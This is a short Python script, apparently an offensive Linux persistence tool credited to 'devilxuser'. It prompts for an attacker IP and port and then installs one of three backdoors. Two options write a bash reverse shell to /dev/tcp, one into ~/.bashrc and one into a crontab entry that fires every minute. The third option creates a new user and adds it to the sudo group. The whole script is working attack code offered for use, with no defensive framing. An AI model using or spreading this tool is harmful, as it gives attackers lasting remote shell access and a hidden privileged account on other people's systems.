import os

print('''
| |    |    ||    \ |  |  ||  |  |       |    \   /  _]|    \  / ___/|    | / ___/|      |  /  _]|    \    /  ]  /  _]
| |     |  | |  _  ||  |  ||  |  | _____ |  o  ) /  [_ |  D  )(   \_  |  | (   \_ |      | /  [_ |  _  |  /  /  /  [_ 
| |___  |  | |  |  ||  |  ||_   _||     ||   _/ |    _]|    /  \__  | |  |  \__  ||_|  |_||    _]|  |  | /  /  |    _]
|     | |  | |  |  ||  :  ||     ||_____||  |   |   [_ |    \  /  \ | |  |  /  \ |  |  |  |   [_ |  |  |/   \_ |   [_ 
|     | |  | |  |  ||     ||  |  |       |  |   |     ||  .  \ \    | |  |  \    |  |  |  |     ||  |  |\     ||     |
|_____||____||__|__| \__,_||__|__|       |__|   |_____||__|\_|  \___||____|  \___|  |__|  |_____||__|__| \____||_____|                                                                                                                      

''')
print("Created by devilxuser also known as computer_boy on social media :)")

ip = input("Enter your IP: ")
port = input("Enter the port you want to listen on: ")
per = input('''Enter which persistence you want(1,2,3):
          1) .bashrc Persistence
          2) Privileged User (newuser)
          3) Crontab Persistence
          ''')

if per == '1':

    command = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    # Use echo to add the command to .bashrc
    os.system(f'echo "{command}" >> ~/.bashrc')
    print(".bashrc Persistence added.")

elif per == '2':

    username = input("Enter the username for the new privileged user: ")
    os.system(f'sudo useradd -m {username}')
    os.system(f'sudo usermod -aG sudo {username}')
    print(f"Privileged user '{username}' created.")

elif per == '3':

    command = f"* * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    os.system(f'(crontab -l; echo "{command}") | crontab -')
    print("check it through etering ,'crontab -l'")
    print("Crontab Persistence added.")

else:
    print("Invalid option selected.")

